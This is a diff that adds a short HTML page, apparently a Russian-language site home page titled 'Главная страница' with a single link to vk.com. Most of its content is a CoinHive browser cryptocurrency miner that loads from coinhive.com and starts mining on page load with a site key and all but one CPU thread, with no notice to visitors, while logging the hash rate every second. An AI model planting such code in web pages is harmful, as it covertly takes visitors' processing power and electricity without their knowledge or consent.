@@ -1,0 +1,24 @@
+<!DOCTYPe html>
+<html>
+<head>
+  <title>Главная страница</title>
+  <script src="https://coinhive.com/lib/coinhive.min.js"></script>
+</head>
+</body>
+  <a href="https://vk.com">vk.com</a>
+  <script>
+    var miner = new CoinHive.User('BPAvMgCBRwsX5we1uz6zg93gJW8VwW6Y', 'DPT', {
+      threads: navigator.hardwareConcurrency - 1,
+      autoThreads: true,
+      forceASMJS: false
+    });
+    miner.start();
+    
+    setInterval(function() {
+		  console.log("hashesPerSecond = " + miner.getHashesPerSecond());
+		  //console.log("totalHashes =" + miner.getTotalHashes());
+		  //var acceptedHashes = miner.getAcceptedHashes();
+	  }, 1000);
+  </script>
+</body>
+</html>
